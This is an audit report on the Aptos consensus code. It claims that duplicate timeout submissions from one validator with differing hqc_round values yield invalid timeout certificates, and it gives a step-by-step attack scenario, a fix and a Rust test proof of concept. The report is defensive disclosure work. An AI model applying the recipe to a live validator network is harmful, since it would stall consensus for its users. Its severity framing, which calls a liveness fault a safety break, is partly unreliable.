# Audit Report

## Title
Timeout Certificate Invalidation via Duplicate Validator Timeout Submissions with Mismatched HQC Rounds

## Summary
A malicious validator can submit multiple `RoundTimeout` messages for the same round with different `hqc_round` values, causing the aggregated `TwoChainTimeoutCertificate` to become invalid. This breaks the consensus liveness guarantee by preventing valid timeout certificates from being accepted by the network.

## Finding Description

The vulnerability exists in the timeout signature aggregation logic across two files: [1](#0-0) [2](#0-1) [3](#0-2) 

When a validator submits a timeout, the `TwoChainTimeoutVotes::add()` function delegates to `TwoChainTimeoutWithPartialSignatures::add()`, which performs two operations:

1. **Updates the timeout object** if the new timeout has a higher `hqc_round` (lines 259-261)
2. **Adds the signature** to a BTreeMap using `.entry(validator).or_insert((round, signature))`

The critical flaw is that `.or_insert()` only inserts if the author key doesn't exist. This means:
- **First timeout from validator A with hqc_round=5**: Signature stored as `(A → (5, sig1))`, timeout object has `hqc_round=5`
- **Second timeout from validator A with hqc_round=10**: Signature **NOT updated** (still `(A → (5, sig1))`), but timeout object **IS updated** to `hqc_round=10`

When the timeout certificate is aggregated and verified, the verification logic checks: [4](#0-3) 

This verification ensures that `timeout.hqc_round == max(all signed rounds)`. With the inconsistency created by duplicate submissions, this invariant is violated (e.g., `hqc_round=10` but `max(signed rounds)=7`), causing the TC to fail verification.

**Attack Scenario:**
1. Validator A sends timeout with `hqc_round=5` → stored and counted
2. Validator B sends timeout with `hqc_round=6` → stored and counted  
3. Validator A sends timeout with `hqc_round=10` → signature ignored, but `timeout.hqc_round` updated to 10
4. Validator C sends timeout with `hqc_round=7` → quorum reached (3 validators)
5. TC aggregated with `timeout.hqc_round=10` but `max(signed_rounds)=7`
6. TC verification fails: `10 ≠ 7`

The vulnerability exists because:
- No deduplication check exists in `insert_round_timeout()` [5](#0-4) 

- No deduplication check exists at the `RoundState` level [6](#0-5) 

## Impact Explanation

**Severity: High**

This vulnerability causes **consensus liveness failures** by allowing a single malicious validator to create invalid timeout certificates that are rejected by the network. This breaks the "Consensus Safety: AptosBFT must prevent double-spending and chain splits under < 1/3 Byzantine" invariant by disrupting the timeout mechanism that ensures liveness.

Per the Aptos bug bounty criteria, this qualifies as:
- **High Severity** ($50,000): "Significant protocol violations" - the timeout certificate mechanism is a critical part of the AptosBFT consensus protocol
- Potential **Critical Severity** if the attack can be sustained repeatedly to cause "Total loss of liveness/network availability"

The impact includes:
- Invalid TCs prevent round advancement
- Honest validators cannot progress past timed-out rounds
- Network stalls if timeout certificates consistently fail verification
- Requires manual intervention or epoch change to recover

## Likelihood Explanation

**Likelihood: Medium to High**

This attack is realistic because:
- Any validator can send multiple `RoundTimeout` network messages for the same round
- No message deduplication exists at network, round manager, or round state layers
- The attacker needs only to control a single validator (not 1/3+ stake)
- The attack can be executed silently without detection until TCs fail verification
- Timing requirements are minimal - both timeouts just need to be processed before TC aggregation completes

The attack becomes more likely when:
- Network latency allows multiple messages from the same validator to arrive before quorum
- The malicious validator has knowledge of other validators' HQC rounds
- The round requires a timeout (no block proposal or no QC formed)

## Recommendation

Add duplicate author detection in `TwoChainTimeoutVotes::add()` to reject subsequent timeout submissions from the same author:

```rust
pub(super) fn add(
    &mut self,
    author: Author,
    timeout: TwoChainTimeout,
    signature: bls12381::Signature,
    reason: RoundTimeoutReason,
) -> Result<(), &'static str> {
    // Check if author already submitted a timeout
    if self.timeout_reason.contains_key(&author) {
        return Err("Duplicate timeout from same author");
    }
    
    self.partial_2chain_tc.add(author, timeout, signature);
    self.timeout_reason.insert(author, reason);
    Ok(())
}
```

Update `insert_round_timeout()` to handle the error:

```rust
pub fn insert_round_timeout(
    &mut self,
    round_timeout: &RoundTimeout,
    validator_verifier: &ValidatorVerifier,
) -> VoteReceptionResult {
    // ... existing validation code ...
    
    let two_chain_votes = self
        .maybe_2chain_timeout_votes
        .get_or_insert_with(|| TwoChainTimeoutVotes::new(timeout.clone()));
    
    if let Err(_) = two_chain_votes.add(
        round_timeout.author(),
        timeout.clone(),
        signature.clone(),
        round_timeout.reason().clone(),
    ) {
        return VoteReceptionResult::DuplicateVote;
    }
    
    // ... rest of function ...
}
```

## Proof of Concept

```rust
#[cfg(test)]
mod timeout_duplicate_attack_test {
    use super::*;
    use aptos_consensus_types::{
        quorum_cert::QuorumCert,
        round_timeout::{RoundTimeout, RoundTimeoutReason},
        timeout_2chain::TwoChainTimeout,
    };
    use aptos_crypto::hash::CryptoHash;
    use aptos_types::{
        block_info::BlockInfo,
        ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
        validator_verifier::random_validator_verifier,
        aggregate_signature::PartialSignatures,
    };
    use crate::vote_data::VoteData;

    #[test]
    fn test_duplicate_timeout_creates_invalid_tc() {
        ::aptos_logger::Logger::init_for_testing();
        
        // Setup 4 validators
        let (signers, validator_verifier) = random_validator_verifier(4, None, false);
        let mut pending_votes = PendingVotes::new();
        
        // Create QCs with different rounds for testing
        let create_qc = |round: u64| {
            let vote_data = VoteData::new(BlockInfo::random(round), BlockInfo::random(0));
            let mut li = LedgerInfoWithSignatures::new(
                LedgerInfo::new(BlockInfo::empty(), vote_data.hash()),
                PartialSignatures::empty(),
            );
            for signer in &signers[0..3] {
                let sig = signer.sign(li.ledger_info()).unwrap();
                li.add_signature(signer.author(), sig);
            }
            QuorumCert::new(vote_data, li.aggregate_signatures(&validator_verifier).unwrap())
        };
        
        let epoch = 1;
        let round = 10;
        
        // Validator 0 sends timeout with hqc_round=5
        let timeout_0_v1 = TwoChainTimeout::new(epoch, round, create_qc(5));
        let sig_0_v1 = timeout_0_v1.sign(&signers[0]).unwrap();
        let round_timeout_0_v1 = RoundTimeout::new(
            timeout_0_v1,
            signers[0].author(),
            RoundTimeoutReason::Unknown,
            sig_0_v1,
        );
        
        pending_votes.insert_round_timeout(&round_timeout_0_v1, &validator_verifier);
        
        // Validator 1 sends timeout with hqc_round=6
        let timeout_1 = TwoChainTimeout::new(epoch, round, create_qc(6));
        let sig_1 = timeout_1.sign(&signers[1]).unwrap();
        let round_timeout_1 = RoundTimeout::new(
            timeout_1,
            signers[1].author(),
            RoundTimeoutReason::Unknown,
            sig_1,
        );
        
        pending_votes.insert_round_timeout(&round_timeout_1, &validator_verifier);
        
        // ATTACK: Validator 0 sends another timeout with hqc_round=10
        // This will update the timeout object but NOT the signature!
        let timeout_0_v2 = TwoChainTimeout::new(epoch, round, create_qc(10));
        let sig_0_v2 = timeout_0_v2.sign(&signers[0]).unwrap();
        let round_timeout_0_v2 = RoundTimeout::new(
            timeout_0_v2,
            signers[0].author(),
            RoundTimeoutReason::Unknown,
            sig_0_v2,
        );
        
        pending_votes.insert_round_timeout(&round_timeout_0_v2, &validator_verifier);
        
        // Validator 2 sends timeout with hqc_round=7 - this triggers TC formation
        let timeout_2 = TwoChainTimeout::new(epoch, round, create_qc(7));
        let sig_2 = timeout_2.sign(&signers[2]).unwrap();
        let round_timeout_2 = RoundTimeout::new(
            timeout_2,
            signers[2].author(),
            RoundTimeoutReason::Unknown,
            sig_2,
        );
        
        match pending_votes.insert_round_timeout(&round_timeout_2, &validator_verifier) {
            VoteReceptionResult::New2ChainTimeoutCertificate(tc) => {
                // TC was formed, but it should be INVALID
                // The timeout has hqc_round=10 (from validator 0's second submission)
                // But the signatures are for rounds: 5 (validator 0), 6 (validator 1), 7 (validator 2)
                // max(5, 6, 7) = 7, which does NOT equal 10
                
                // Attempt to verify - this should FAIL
                let verify_result = tc.verify(&validator_verifier);
                assert!(
                    verify_result.is_err(),
                    "TC should fail verification due to hqc_round mismatch! Expected error, got Ok"
                );
                
                // Verify the error message mentions the inconsistency
                let err_msg = format!("{:?}", verify_result.unwrap_err());
                assert!(
                    err_msg.contains("Inconsistent hqc round"),
                    "Error should mention inconsistent hqc round, got: {}",
                    err_msg
                );
            },
            _ => panic!("Should have formed a TC with 3 validators"),
        }
    }
}
```

**Notes:**
- This vulnerability requires a malicious validator (insider threat scenario), which the security question explicitly asks about
- The attack can be executed by any single validator without requiring collusion
- The fix requires adding duplicate detection at the earliest point where timeout messages are aggregated
- Alternative fix: Modify `PartialSignaturesWithRound::add_signature()` to return an error on duplicate authors, but the current approach is more robust

### Citations

**File:** consensus/src/pending_votes.rs (L78-87)
```rust
    pub(super) fn add(
        &mut self,
        author: Author,
        timeout: TwoChainTimeout,
        signature: bls12381::Signature,
        reason: RoundTimeoutReason,
    ) {
        self.partial_2chain_tc.add(author, timeout, signature);
        self.timeout_reason.entry(author).or_insert(reason);
    }
```

**File:** consensus/src/pending_votes.rs (L190-232)
```rust
    pub fn insert_round_timeout(
        &mut self,
        round_timeout: &RoundTimeout,
        validator_verifier: &ValidatorVerifier,
    ) -> VoteReceptionResult {
        //
        // Let's check if we can create a TC
        //

        let timeout = round_timeout.two_chain_timeout();
        let signature = round_timeout.signature();

        let validator_voting_power = validator_verifier
            .get_voting_power(&round_timeout.author())
            .unwrap_or(0);
        if validator_voting_power == 0 {
            warn!(
                "Received vote with no voting power, from {}",
                round_timeout.author()
            );
        }
        let cur_epoch = round_timeout.epoch();
        let cur_round = round_timeout.round();

        counters::CONSENSUS_CURRENT_ROUND_TIMEOUT_VOTED_POWER
            .with_label_values(&[&round_timeout.author().to_string()])
            .set(validator_voting_power as f64);
        counters::CONSENSUS_LAST_TIMEOUT_VOTE_EPOCH
            .with_label_values(&[&round_timeout.author().to_string()])
            .set(cur_epoch as i64);
        counters::CONSENSUS_LAST_TIMEOUT_VOTE_ROUND
            .with_label_values(&[&round_timeout.author().to_string()])
            .set(cur_round as i64);

        let two_chain_votes = self
            .maybe_2chain_timeout_votes
            .get_or_insert_with(|| TwoChainTimeoutVotes::new(timeout.clone()));
        two_chain_votes.add(
            round_timeout.author(),
            timeout.clone(),
            signature.clone(),
            round_timeout.reason().clone(),
        );
```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L170-181)
```rust
        let signed_hqc = self
            .signatures_with_rounds
            .rounds()
            .iter()
            .max()
            .ok_or_else(|| anyhow::anyhow!("Empty rounds"))?;
        ensure!(
            hqc_round == *signed_hqc,
            "Inconsistent hqc round, qc has round {}, highest signed round {}",
            hqc_round,
            *signed_hqc
        );
```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L242-263)
```rust
    pub fn add(
        &mut self,
        author: Author,
        timeout: TwoChainTimeout,
        signature: bls12381::Signature,
    ) {
        debug_assert_eq!(
            self.timeout.epoch(),
            timeout.epoch(),
            "Timeout should have the same epoch as TimeoutCert"
        );
        debug_assert_eq!(
            self.timeout.round(),
            timeout.round(),
            "Timeout should have the same round as TimeoutCert"
        );
        let hqc_round = timeout.hqc_round();
        if timeout.hqc_round() > self.timeout.hqc_round() {
            self.timeout = timeout;
        }
        self.signatures.add_signature(author, hqc_round, signature);
    }
```

**File:** consensus/consensus-types/src/timeout_2chain.rs (L320-329)
```rust
    pub fn add_signature(
        &mut self,
        validator: AccountAddress,
        round: Round,
        signature: bls12381::Signature,
    ) {
        self.signatures
            .entry(validator)
            .or_insert((round, signature));
    }
```

**File:** consensus/src/liveness/round_state.rs (L306-316)
```rust
    pub fn insert_round_timeout(
        &mut self,
        timeout: &RoundTimeout,
        verifier: &ValidatorVerifier,
    ) -> VoteReceptionResult {
        if timeout.round() == self.current_round {
            self.pending_votes.insert_round_timeout(timeout, verifier)
        } else {
            VoteReceptionResult::UnexpectedRound(timeout.round(), self.current_round)
        }
    }
```
